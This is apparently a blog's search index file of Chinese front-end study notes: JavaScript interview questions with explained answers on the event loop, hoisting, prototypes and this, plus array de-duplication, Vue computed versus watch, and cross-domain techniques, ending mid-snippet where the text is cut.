<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[week1面试题整理]]></title>
    <url>%2F2018%2F09%2F04%2Fweek1%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[第一题123456789101112131415161718192021222324252627282930313233343536setTimeout(function() &#123; console.log('start'); //第二步,打印'start' new Promise(function(resolve, reject) &#123; resolve(true); //执行then中的resolve方法 reject(false); //状态凝固了不执行 console.log(1); //prmise类是同步的,第三步打印1 &#125;).then(function() &#123; setTimeout('var x=2;console.log(2);'); //放入宏任务中 console.log(a); //a未定义会报错,then中返回的promise实例，执行reject方法 &#125;, function() &#123; setTimeout('var x=3;console.log(3)'); console.log(b); &#125;).then(function() &#123; console.log(4); &#125;, function() &#123; console.log(5); //a报错之后执行，第四步打印5 &#125;).catch(function() &#123; console.log(6); &#125;)&#125;, 0)setTimeout(function() &#123; const timer = setInterval(function() &#123; console.log(7); //放入宏任务中 &#125;, 10) const start = Date.now(); setTimeout(function() &#123; //放入宏任务中 while (Date.now() - start &lt;= 30) &#123;&#125; clearTimeout(timer); try &#123; console.log(x); &#125; catch (e) &#123; console.log(8); &#125; &#125;, 13)&#125;, 0)console.log('end'); //第一步,打印'end' 题解： 1、首先两个定时器都放入宏任务中，先执行主任务中的代码，打印’end’ 2、此时主任务队列任务执行完成去执行第一个宏任务,先执行同步代码，打印’start’ 3、随之执行promise类中的代码,打印’1’,执行resolve,由于这个时候状态改变了，所以不会执行reject方法，跳过 4、执行resolve之后，执行第一个then中的第一个回调函数，遇到setTimeout放入宏任务中,在打印a的时候由于a未定义会报错， 5、在第四步中a报错之后，触发reject方法，执行第二个then中第二个回调函数捕获错误,打印’5’,由于then中存在第二个回调函数，因此 不会走catch，如果传递下来then没有第二个回调，才会走catch方法 6、第一个宏任务走完之后，走第二个宏任务，遇到两个定时器，也都放入宏任务中，现在我们一共剩下三个宏任务(第四步一个和这里两个),我们来看着三个宏任务是怎么执行的。 7、setTimeout(‘var x=2;console.log(2);’);分在浏览器环境还是node环境中,首先setTimeout是可以传字符串的，但是不推荐。 在浏览器环境下解析该字符串，相当于eval函数，解析完成之后，其变量会暴露在当前作用域中，由于回调中的作用域是全局(this指向window),因此x=2暴露在全局作用域下，会打印2, 如果在node环境中，这段字符串是不会解析的，直接跳过这行代码，继续执行下面的宏任务 8、再执行setInterval打印7, 9、剩下最后一个宏任务,首先这里用到了一个知识点,用while阻塞了主线程,如果是在浏览器环境下，由于第七步将x=2暴露在了全局下，所以这里不会报错,将2打印出来。如果是在node环境中，由于setTimeout(‘var x=2;console.log(2);’)这行代码不走，打印x就会报错，catch捕获异常后打印出8 最后总结：输出结果是浏览器：’end’、’start’、1、5、2、7、2node环境：’end’、’start’、1、5、7、8知识点：如果有两个宏任务，一个宏任务先执行的话，先执行完第一个宏任务中的微任务，再去执行宏任务。while可以阻塞主线程：通过时间戳来控制阻塞时间。 第二题12345678910111213141516+function() &#123; alert(a); //a&#123;2&#125; a(); //2 var a = function() &#123; console.log(1); &#125; function a() &#123; console.log(2); &#125; alert(a); //a&#123;1&#125; a(); //1 var c = d = a;&#125;()alert(d);alert(c); 题解： 外面是一个自执行函数，进入之后先进行变量提升，函数的提升会提升到顶部，然后再是变量a的提升 1、函数是声明+定义;变量只声明不定义,函数提升之后，变量a不会再声明;第一句alert(a),是打印函数体function(){console.log(2)} 2、a()执行时，打印2 3、执行到第二个alert之后，a已经被重新赋值了，覆盖掉之前的函数体，这个时候弹出的是函数体function(){console.log(1)} 4、执行a(),打印1 5、var c = d = a;执行这句的时候，c是带var的,b没有带var,b给全局增加属性，c是私有变量 6、在外面打印的时候d弹出函数体a、c会报错 第三题123456789101112131415161718function Foo() &#123; getName = function() &#123; console.log(1); &#125;; return this;&#125;Foo.getName = function() &#123; console.log(2); &#125;;Foo.prototype.getName = function() &#123; console.log(3); &#125;;var getName = function() &#123; console.log(4); &#125;;function getName() &#123; console.log(5); &#125;//请写出以下输出结果：Foo.getName(); //2getName(); //4Foo().getName(); //1getName(); //1new Foo.getName(); //2new Foo().getName(); //3new new Foo().getName(); //3 题解： Foo.getName()执行的是Foo上的私有方法 打印的是2 getName()执行的是window下的，这个时候getName是var getName = function() { console.log(4); }; 打印的是4 Foo().getName();当Foo执行之后，window下的getName被修改为getName = function() { console.log(1); }; 打印的是1 getName();再执行的时候，window下的getName还是getName = function() { console.log(1); }; 打印的是1 new Foo.getName();点的优先级高，先是访问Foo私有属性上的getName再new 打印的是2 new Foo().getName();这个时候先new Foo()所以是Foo的实例去调用，原型上的getName方法 打印的是3 new new Foo().getName();先执行new Foo()实例去调用原型上的getName方法，再new 打印的是3 第四题12345678910111213141516171819function teacher(name, age) &#123; this.name = name; this.age = age;&#125;teacher.prototype.sayName = function() &#123; console.log('name' + this.name);&#125;teacher.prototype.sayAge = function() &#123; console.log('age' + this.age);&#125;function student() &#123; var args = arguments; teacher.call(this, args[0], args[1])&#125;student.prototype = new teacher();var student1 = new student('zhufeng', 8);student1.sayName(); //'name' + zhufengstudent1.sayAge(); //'age' + 8 题解： student.prototype = new teacher()这个时候student的原型称为了teacher的实例，就可以通过student.prototype.proto找到teacher原型上的sayName和sayAge方法 student1是student的实例，通过proto找到student的原型，student的原型再通过proto去找到teacher原型上的sayName和sayAge方法 第五题12//对下列数组进行排序let arr = ["五", "二", "六", "一", "四", "三"]; 方法一： 123456789101112var obj = &#123; '一': 1, '二': 2, '三': 3, '四': 4, '五': 5, '六': 6&#125;arr.sort(function(a, b) &#123; return obj[a] - obj[b];&#125;)console.log(arr); 方法二： 123456789101112131415arr = arr.reduce(function(prev, next, index) &#123; prev.push(obj[next]); prev = prev.sort(function(a, b) &#123; return a - b; &#125;); if (index === 5) &#123; prev = prev.map(function(item) &#123; for (let key of Object.keys(obj)) &#123; if (obj[key] === item) &#123; return key; &#125; &#125; &#125;) &#125; return prev;&#125;, []);console.log(arr);]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>第一周面试题整理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数组去重方法汇总]]></title>
    <url>%2F2018%2F09%2F04%2F%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[基本方法 思路：创建一个新数组，遍历原数组，若遍历元素在新数组不存在就添加到数组中，反正则忽略 12345678910111213141516function uniqeArray(arr)&#123; var res = []; for(var i = 0;i &lt; arr.length;i++)&#123; var repeat = false; for(var j = 0;j &lt; res.length ; j++)&#123; if(arr[i] === res[j])&#123; repeat = true; break; &#125; &#125; if(!repeat)&#123; res.push(arr[i]); &#125; &#125; return res;&#125; 先排序再去重 思路：先对数组排序，再定义一个新的数组，遍历排序后的数组，若排序后的数组元素不等于新数组的最后一个元素，则添加。 12345678910111213function uniqeArray(arr)&#123; function sortNumber(a , b)&#123; return a - b; &#125; var newArr = arr.sort(sortNumber); var res = []; for(var i = 0;i &lt; newArr.length;i++)&#123; if(newArr[i] !== res[res.length - 1])&#123; res.push(newArr[i]); &#125; &#125; return res;&#125; 对象去重 思路：利用对象的属性。遍历数组，若该数组元素不是对象的属性，则添加。 1234567891011function uniqeArray(arr) &#123; var res = []; var temp = &#123;&#125;; for(var i = 0; i&lt; arr.length; i++)&#123; if(!temp[arr[i]])&#123; res.push(arr[i]); temp[arr[i]] = 1; &#125; &#125; return res;&#125; filter、indexOf方法 思路：通过filter筛选出去重后的数组。若indexOf方法在该元素之后再查不到该元素的位置，表示该元素不存在，符合要求。 12345function uniqeArray(arr) &#123; return arr.filter(function (item, index, array) &#123; return array.indexOf(item, index+1) === -1; &#125;)&#125; ES6 Set 思路：利用ES6中Set不包含重复元素的思想，为数组创建set对象，再将set对象转换为数组。 123function uniqeArray(arr) &#123; return Array.from(new Set(arr));&#125;]]></content>
      <categories>
        <category>数组</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>去重</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue中watch和computed的区别]]></title>
    <url>%2F2018%2F09%2F03%2Fwatch%E5%92%8Ccomputed%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[computed和watch的区别从属性名上分析 computed是一个计算属性，也就是依赖其他的属性计算所得出最后的值 watch是去监听一个值的变化，然后执行相对应的函数。从实现上分析： computed的值再getter执行后是会缓存的，知识在它依赖的属性值改变之后，下一次获取computed的值才会重新调用对应的getter来计算;支持缓存 watch在每次监听的值变化时，都会执行回调。不支持缓存。从场景上分析： 如果一个值依赖多个属性(多对一),用computed肯定是更加方便的 如果一个值变化后会引起一系列操作，或者一个值变化会引起一系列的变化(用watch会更加方便一些)从计算上分析 computed通常就是简单的计算 watch的回调里面会传入监听属性的新旧值,通过这两个值可以做一些特定的操作。从数据上分析： computed是用于定义基于数据之上的数据 watch是你想在某个数据变化时做一些事情 注：如果watch是你想在某个数据变化时做的事情是更新其他数据，那其实与把这个要更新的数据项定义成computed是一样的，这个时候用computed更有可读性,虽然在技术上讲watch也可以实现。 从写法上分析： computed的返回是state处理后的结果 watch是赋值行为，修改state 从异步上分析： computed不支持异步 watch支持异步]]></content>
      <categories>
        <category>Vue学习笔记</category>
      </categories>
      <tags>
        <tag>Vue学习笔记</tag>
        <tag>computed和watch的区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue中watch和computed的区别]]></title>
    <url>%2F2018%2F09%2F03%2Fweek2%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[题目：请实现方法 parse ，作用如下：1234567891011121314151617181920212223242526272829303132333435var object = &#123; b: &#123; c: 4 &#125;, d: [&#123; e: 5 &#125;, &#123; e: 6 &#125;]&#125;;console.log(parse(object, 'b.c') == 4) //true console.log(parse(object, 'd[0].e') == 5) //trueconsole.log(parse(object, 'd.0.e') == 5) //trueconsole.log(parse(object, 'd[1].e') == 6) //trueconsole.log(parse(object, 'd.1.e') == 6) //trueconsole.log(parse(object, 'f') == 'undefined') //truefunction parse(obj, str) &#123; var arr = str.split(""); //将字符串分割，放进数组中 arr = arr.map(function(item, index) &#123; if (!isNaN(item)) &#123; //判断是否是数字 if (arr[index - 1] != '[' &amp;&amp; arr[index + 1] != ']') &#123; //如果前后没有,则返回[item] return "[" + item + "]"; &#125; else &#123; //如果不是上述情况，则直接返回该项 return item; &#125; &#125; else &#123; //如果不是数字的情况下,.后面是数字,则需要去掉前面的. if (item === "." &amp;&amp; !isNaN(arr[index + 1])) &#123; return ""; &#125; return item; &#125; &#125;) //将数组join方法变成字符串赋值给str str = arr.join(""); //将结果返回 return eval('obj.' + str) || 'undefined';&#125; 题解： 1、首先，我们拿到题的时候，应该分析题目的目的。首先是一个object对象，然后通过parse传参的形式，将对象object和字符串作为参数传进去。返回值是获取object对象属性值，属性值存在的时候返回属性值，不存在的时候返回undefined。 2、获取属性值有两种方式：object[属性名]或者object.属性名，但是属性名是数字的时候只能采用第一种方式。所以我们要对这种情况进行讨论。 3、下面我们要讨论的就是数字这种情况的，分析数字前后有没有[]，如果有，那么我们不需要做什么，直接返回，如果数字前后没有[],那么我们是需要手动给数字前后加上[],并且把前面的’.’去掉。 4、分析好上述情况之后，我们代码实现：首先传入obj,str 4.1、我们将str.split(“”)，放入数组中，然后采用数组的map方法进行遍历，分两种情况，是数字，和不是数字 4.2、是数字中，又分为数字前后有没有[],没有就添加上再返回，有就直接返回 4.3、不是数字的话，如果是’.’,则需要判断’.’后面是否是数字，如果是数字，就返回空字符串 4.4、将map映射后的数组重新赋值给arr，最后用arr.join(“”)拼接之后转字符串再赋值给str 4.5、最后我们需要运算之后，将属性值返回来，字符串的运算，我们采用eval来运算。 题目：请写出如下输出值,并写出把注释掉的代码取消注释的值，并解释为什么？ 12345678910111213141516this.a = 20; //给window新增一个属性a,并赋给属性值20var test = &#123; a: 40, init: () =&gt; &#123; console.log(this.a); //箭头函数没有this，会向上级作用域找，上级作用域是window，所以这里打印的this.a其实是window.a，打出属性值20 function go() &#123; //this.a = 60; console.log(this.a); //this指向实例,因为是new执行的,原型上有a=50，打印50。如果解开注释的话，自己私有属性有，就找自己私有属性，打印60 &#125; go.prototype.a = 50; return go; &#125;&#125;;//var p = test.init();//p();//这里执行的话，go中的this指向window，new(test.init())(); 我们从上到下一行一行分析： 1、this.a当前作用域是window，所以执行这句话的时候相当于给window新增了键值对a:20 2、再到test是一个对象,有一个init方法，是一个箭头函数，箭头函数中的this会指向window，然后箭头函数中的返回值是一个go函数 3、我们先不看注释掉的代码，看函数怎么执行的，先是new(test.init())()，是new test.init()也就是说是init的返回值new，那么这个时候go就是一个构造函数，init执行的时候打印this.a是20,再new go()的时候，go中的this指向它的实例，this自己没有a属性，找到原型上的a属性，打印50 4、因此，在不看注释的代码，依次打印的是：20、50 5、我们再解开注释代码，用变量p接收test.init()的返回值，也就是把go的空间地址赋值给p了，p()执行的时候，这个时候go中的this会指向window,在go中又修改了this.a的值为60； 6、new(test.init())()执行这句的时候，跟上面第三步的分析一样，只不过这个时候给this新增了私有属性a，就直接打印60 7、因此，在解开注释之后，打印的顺序依次是：20、60、60、60 写出下面程序的输出结果123456var arr1 = "john".split('');//arr1=['j','o','h','n']var arr2 = arr1.reverse();//arr2=arr1=['n','h','o','j']var arr3 = "jones".split('');//arr3=['j','o','n',e','s']arr2.push(arr3);//arr1=arr2=['n','h','o','j',['j','o','n',e','s']]console.log("array 1: length=" + arr1.length + " last=" + arr1.slice(-1));console.log("array 2: length=" + arr2.length + " last=" + arr2.slice(-1)); 题解： 1、arr1 = “john”.split(‘’);分割之后，得到数组：arr1=[‘j’,’o’,’h’,’n’] 2、arr2 = arr1.reverse();由于reverse会改变原数组，将arr1.reverse的返回值给arr2，所以arr2与arr1指向同一个地址；得到：arr2=arr1=[‘n’,’h’,’o’,’j’] 3、arr3 = “jones”.split(‘’);分割之后得到：arr3=[‘j’,’o’,’n’,e’,’s’] 4、arr2.push(arr3);将arr3直接push在末尾，得到：arr1=arr2=[‘n’,’h’,’o’,’j’,[‘j’,’o’,’n’,e’,’s’]] 5、因此打印arr1和arr2的长度是5，slice(-1)截取的时候，是索引为5+(-1)的值[‘j’,’o’,’n’,e’,’s’]，转字符串就是’j’,’o’,’n’,e’,’s’ 写出下列程序的输出结果1234567891011function f1(n) &#123; n = n || 2; return function (x) &#123; return (x * n); &#125;&#125;var f2 = f1();//function(x)&#123;return (x*2)&#125;var f3 = f1(3);//function(x)&#123;return (x*3)&#125;console.log(f2(3));//6console.log(f3(3));//9console.log(f3(f2(3)));//18 什么是跨域？常用的跨域方式有哪些？由于浏览器存在同源策略，请求的 Url 地址的协议、主机名、端口号必须完全相同，否则会产生跨域， 同源策略的限制下 cookie 、loclstorage、dom、ajax、IndexDB 等都不允许跨域、form 表单不受同源策略限制 对跨域的理解有一个误区，跨域不是请求没有发送出去或者服务器接收到请求而没有响应，正确的情况是请求发出，服务器响应，由于响应和请求来自不同的域被浏览器拦截了。 跨域的方式有以下几种： 1、jsonp：通过 script 的 src 属性发送请求，传参必须含有 callback 回调的名称，服务器返回函数的调用，接收到响应直接执行； 2、cors：通过服务端设置 Access-Control-Allow-Origin，通常在后端通过白名单设置权限允许固定的域来访问 3、window.postMessage：H5 API，消息接收方通过 message 事件接收，事件对象 data 属性代表接收的消息，可以通过事件对象的 source 属性 通过 source.postMessage(“message”, e.origin) 进行回复 4、可以使用 window.name 和 location.hash 在不同域的 iframe 页面之间进行消息传递 5、document.domain：如果域名之间是一二级域名的关系，可以将页面的 document.domain 设置为一级域名的后半部分，如：baidu.com 实现跨域 6、可以使用 websocket 进行跨域，websocek 的协议为 ws:// 或 wss:// 是实时通信，不存在跨域问题。 7、服务器与服务器之间通信不受浏览器同源策略限制，因此不存在跨域问题，可以使用 nginx 或 node 的 http-proxy-middleware 中间件实现作为代理服务器帮助浏览器对请求进行转发，完成与不同域的服务器之间的通信，webpack-dev-server 就是通过 http-proxy-middleware 实现的跨域 详情请看：https://www.pandashen.com/2018/06/11/20180611010638/ 性能优化详情见我的博客地址：https://kejinzhu.cn/2018/08/15/web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7%E6%B1%87%E6%80%BB/#more]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>第二周面试题整理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue学习-钩子函数之生命周期]]></title>
    <url>%2F2018%2F09%2F03%2FVue%E5%AD%A6%E4%B9%A0-%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0%E4%B9%8B%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%2F</url>
    <content type="text"><![CDATA[生命周期 beforeCreate created beforeMount mounted beforeUpdate updated beforeDestroy destroyed]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>生命周期</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue学习之-双向数据绑定原理]]></title>
    <url>%2F2018%2F09%2F01%2FVue%E5%AD%A6%E4%B9%A0%E4%B9%8B-%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[项目细节点梳理]]></title>
    <url>%2F2018%2F08%2F31%2F%E9%A1%B9%E7%9B%AE%E7%BB%86%E8%8A%82%E7%82%B9%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[关于软技能的问题要点]]></title>
    <url>%2F2018%2F08%2F31%2F%E5%85%B3%E4%BA%8E%E8%BD%AF%E6%8A%80%E8%83%BD%E7%9A%84%E9%97%AE%E9%A2%98%E8%A6%81%E7%82%B9%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[开发环境知识点与高频考点梳理]]></title>
    <url>%2F2018%2F08%2F31%2F%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E9%AB%98%E9%A2%91%E8%80%83%E7%82%B9%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[浏览器相关知识点与高频考点梳理]]></title>
    <url>%2F2018%2F08%2F31%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E9%AB%98%E9%A2%91%E8%80%83%E7%82%B9%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[从容应对算法题目]]></title>
    <url>%2F2018%2F08%2F31%2F%E4%BB%8E%E5%AE%B9%E5%BA%94%E5%AF%B9%E7%AE%97%E6%B3%95%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[CSS-HTML知识点与高频考点梳理]]></title>
    <url>%2F2018%2F08%2F31%2FCSS-HTML%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E9%AB%98%E9%A2%91%E8%80%83%E7%82%B9%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[JS-Web-API知识点与高频考点梳理]]></title>
    <url>%2F2018%2F08%2F31%2FJS-Web-API%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E9%AB%98%E9%A2%91%E8%80%83%E7%82%B9%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[ES基础知识与高频考点梳理]]></title>
    <url>%2F2018%2F08%2F31%2FES%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B8%8E%E9%AB%98%E9%A2%91%E8%80%83%E7%82%B9%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"><![CDATA[知识点梳理目录列表 变量类型 JS的数据类型分类和判断 值类型和引用类型 原型与原型链(继承) 原型和原型链的定义 继承写法 作用域和闭包 执行上下文 this 闭包是什么 异步 同步VS异步 异步和单线程 前端异步的场景 ES6/7新标准的考查 箭头函数 module class set和map promise变量类型JavaScript是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型ECMAScript中定义了6种原始类型 boolean string number undefined null symbol 题目：类型判断用到哪些方法？typeoftypeof xxx得到的值有一下类型：undefined、boolean、number、string、object、function、symbol typeof null结果是object，实际这是typeof的一个bug，null是原始值，非引用类型 typeoof [1,2]结果是object，结果中没有这一项，引用类型除了function其他的全部都是object typeof Symbol()用typeof获取symbol类型的值得到的是symbol，这是ES6新增的知识点 instanceof用于实例和构造函数的对应。例如判断一个变量是否是数组，使用typeof无法判断,但可以使用[1,2] instanceof Array来判断。因为,[1,2]是数组,它的构造函数就是Array：同理 12345function Foo(name) &#123; this.name = name&#125;var foo = new Foo('bar')console.log(foo instanceof Foo) // true constructorobject.prototype.toString.call()题目：值类型和引用类型的区别值类型VS引用类型除了原始类型，ES还有引用类型，上文提到的typeof识别出来的类型中,只有object和function是引用类型，其他都是值类型 根据JavaScript中的变量类型传递方式，又分为值类型和引用类型值类型包括：Boolean、string、number、undefined、null;引用类型包括：object类的所有，如Date、Array、function等。在参数传递方式上，值类型是按值传递，引用类型是按地址传递 123456// 值类型var a = 10var b = ab = 20console.log(a) // 10console.log(b) // 20 上述代码中，a b都是值类型，两者分别修改赋值，相互之间没有任何影响。再看引用类型的例子： 1234567// 引用类型var a = &#123;x: 10, y: 20&#125;var b = ab.x = 100b.y = 200console.log(a) // &#123;x: 100, y: 200&#125;console.log(b) // &#123;x: 100, y: 200&#125;... 上述代码中，a b都是引用类型。在执行了b = a之后，修改b的属性值，a的也跟着变化。因为a和b都是引用类型，指向了同一个内存地址，即两者引用的是同一个值，因此b修改属性时，a的值随之改动。再借助题目进一步讲解一下。 题目：说出下面代码的执行结果，并分析其原因。123456789101112function foo(a)&#123; a = a * 10;&#125;function bar(b)&#123; b.value = 'new';&#125;var a = 1;var b = &#123;value: 'old'&#125;;foo(a);bar(b);console.log(a); // 1console.log(b); // value: new... 通过代码执行，会发现： a的值没有发生改变 b的值发生了改变这就是因为Number类型的a是按值传递的，而Object类型的b是按地址传递的。 JS 中这种设计的原因是：按值传递的类型，复制一份存入栈内存，这类类型一般不占用太多内存，而且按值传递保证了其访问速度。按共享传递的类型，是复制其引用，而不是整个复制其值（C 语言中的指针），保证过大的对象等不会因为不停复制内容而造成内存的浪费。… 引用类型经常会在代码中按照下面的写法使用，或者说容易不知不觉中造成错误！ 123456789var obj = &#123; a: 1, b: [1,2,3]&#125;var a = obj.avar b = obj.ba = 2b.push(4)console.log(obj, a, b) 虽然obj本身是个引用类型的变量（对象），但是内部的a和b一个是值类型一个是引用类型，a的赋值不会改变obj.a，但是b的操作却会反映到obj对象上。 原型和原型链JavaScript 是基于原型的语言，原型理解起来非常简单，但却特别重要，下面还是通过题目来理解下JavaScript 的原型概念。 题目：如何理解JavaScript的原型对于这个问题，可以从下面这几个要点来理解和回答，下面几条必须记住并且理解 1.每一个函数数据类型（函数、类）都天生自带一个prototype属性，prototype的属性值是一个对象数据类型的； prototype 属性中天生自带一个constructor属性，属性值是当前原型所属的类； 3.每一个对象数据类型值（对象、数组、arguments…）天生自带一个proto属性，属性值指向当前实例所属类的原型； 4.所有的函数数据类型（普通函数、类（内置的、自定义））都是Function的一个实例；Function是所有函数的基类； 5.所有的对象数据类型（实例、prototype、对象）都是Object的一个实例；Object是所有对象数据类型的基类； 12345678910111213// 要点一：自由扩展属性var obj = &#123;&#125;; obj.a = 100;var arr = []; arr.a = 100;function fn () &#123;&#125;fn.a = 100;// 要点二：__proto__console.log(obj.__proto__);console.log(arr.__proto__);console.log(fn.__proto__);// 要点三：函数有 prototypeconsole.log(fn.prototype)// 要点四：引用类型的 __proto__ 属性值指向它的构造函数的 prototype 属性值console.log(obj.__proto__ === Object.prototype)... 原型123456789101112131415// 构造函数function Foo(name, age) &#123; this.name = name&#125;Foo.prototype.alertName = function () &#123; alert(this.name)&#125;// 创建示例var f = new Foo('zhangsan')f.printName = function () &#123; console.log(this.name)&#125;// 测试f.printName()f.alertName()... 执行printName时很好理解，但是执行alertName时发生了什么？这里再记住一个重点 当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的proto（即它的构造函数的prototype）中寻找，因此f.alertName就会找到Foo.prototype.alertName。… 那么如何判断这个属性是不是对象本身的属性呢？使用hasOwnProperty，常用的地方是遍历一个对象的时候。 1234567var itemfor (item in f) &#123; // 高级浏览器已经在 for in 中屏蔽了来自原型的属性，但是这里建议大家还是加上这个判断，保证程序的健壮性 if (f.hasOwnProperty(item)) &#123; console.log(item) &#125;&#125;... 题目：如何理解JS的原型链原型链还是接着上面的示例，如果执行f.toString()时，又发生了什么？ 1234// 测试f.printName()f.alertName()f.toString() 因为f本身没有toString()，并且f.__proto__（即Foo.prototype）中也没有toString。这个问题还是得拿出刚才那句话——当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的__proto__（即它的构造函数的prototype）中寻找。 如果在f.__proto__中没有找到toString，那么就继续去f.__proto__.__proto__中寻找，因为f.__proto__就是一个普通的对象而已嘛！… f.__proto__即Foo.prototype，没有找到toString，继续往上找 f.__proto__.__proto__即Foo.prototype.__proto__。Foo.prototype就是一个普通的对象，因此Foo.prototype.__proto__就是Object.prototype，在这里可以找到toString... 因此f.toString最终对应到了Object.prototype.toString 这样一直往上找，你会发现是一个链式的结构，所以叫做“原型链”。如果一直找到最上层都没有找到，那么就宣告失败，返回undefined。最上层是什么 —— Object.prototype.__proto__ === null 原型中的this所有从原型或更高级原型中得到、执行的方法，其中的this在执行时，就指向了当前这个触发事件执行的对象。因此printName和alertName中的this都是f。]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>ES基础知识与高频考点梳理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-react专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-react%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[面试题-跨域专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-%E8%B7%A8%E5%9F%9F%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[面试题-算法专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-%E7%AE%97%E6%B3%95%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[阐述下 JavaScript 中的变量提升所谓提升，顾名思义即是 JavaScript 会将所有的声明提升到当前作用域的顶部。这也就意味着我们可以在某个变量声明前就使用该变量，不过虽然 JavaScript 会将声明提升到顶部，但是并不会执行真的初始化过程。 阐述下 use strict; 的作用use strict; 顾名思义也就是 JavaScript 会在所谓严格模式下执行，其一个主要的优势在于能够强制开发者避免使用未声明的变量。对于老版本的浏览器或者执行引擎则会自动忽略该指令。 1234567// Example of strict mode"use strict";catchThemAll();function catchThemAll() &#123; x = 3.14; // Error will be thrown return x * x;&#125; 解释下什么是 Event Bubbling 以及如何避免Event Bubbling 即指某个事件不仅会触发当前元素，还会以嵌套顺序传递到父元素中。直观而言就是对于某个子元素的点击事件同样会被父元素的点击事件处理器捕获。避免 Event Bubbling 的方式可以使用event.stopPropagation() 或者 IE 9 以下使用event.cancelBubble。 == 与 === 的区别是什么=== 也就是所谓的严格比较，关键的区别在于=== 会同时比较类型与值，而不是仅比较值。 12345// Example of comparators0 == false; // true0 === false; // false2 == '2'; // true2 === '2'; // false 解释下 null 与 undefined 的区别JavaScript 中，null 是一个可以被分配的值，设置为 null 的变量意味着其无值。而 undefined 则代表着某个变量虽然声明了但是尚未进行过任何赋值。 解释下 原型继承 与 类继承 的区别在类继承中，类是不可变的，不同的语言中对于多继承的支持也不一样，有些语言中还支持接口、final、abstract 的概念。而原型继承则更为灵活，原型本身是可以可变的，并且对象可能继承自多个原型。 数组找出整型数组中乘积最大的三个数给定一个包含整数的无序数组，要求找出乘积最大的三个数。 12345678910111213141516171819var unsorted_array = [-10, 7, 29, 30, 5, -10, -70];computeProduct(unsorted_array); // 21000function sortIntegers(a, b) &#123; return a - b;&#125;// greatest product is either (min1 * min2 * max1 || max1 * max2 * max3)function computeProduct(unsorted) &#123; var sorted_array = unsorted.sort(sortIntegers), product1 = 1, product2 = 1, array_n_element = sorted_array.length - 1; // Get the product of three largest integers in sorted array for (var x = array_n_element; x &gt; array_n_element - 3; x--) &#123; product1 = product1 * sorted_array[x]; &#125; product2 = sorted_array[0] * sorted_array[1] * sorted_array[array_n_element]; if (product1 &gt; product2) return product1; return product2&#125;; 寻找连续数组中的缺失数给定某无序数组，其包含了 n 个连续数字中的 n – 1 个，已知上下边界，要求以O(n)的复杂度找出缺失的数字。 1234567891011121314151617181920// The output of the function should be 8var array_of_integers = [2, 5, 1, 4, 9, 6, 3, 7];var upper_bound = 9;var lower_bound = 1;findMissingNumber(array_of_integers, upper_bound, lower_bound); //8function findMissingNumber(array_of_integers, upper_bound, lower_bound) &#123; // Iterate through array to find the sum of the numbers var sum_of_integers = 0; for (var i = 0; i &lt; 